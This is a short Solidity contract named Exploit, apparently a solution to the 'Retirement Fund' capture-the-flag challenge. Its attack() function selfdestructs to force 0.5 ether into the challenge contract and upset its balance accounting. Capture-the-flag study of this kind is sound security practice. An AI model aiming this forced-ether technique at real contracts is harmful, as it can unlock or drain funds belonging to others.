// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IRetirementFundChallenge {
  function collectPenalty (  ) external;
  function withdraw (  ) external;
  function isComplete (  ) external view returns ( bool );
}

contract Exploit {
    IRetirementFundChallenge RetirementFundChallenge;
    address public owner;
    
    constructor(address _address) payable {
        require(msg.value == 0.5 ether);
        owner = msg.sender;
        RetirementFundChallenge = IRetirementFundChallenge(_address);
    }

    function attack() public {
        address payable addr = payable(address(RetirementFundChallenge));
        selfdestruct(addr);
    }

    receive() external payable {}
}
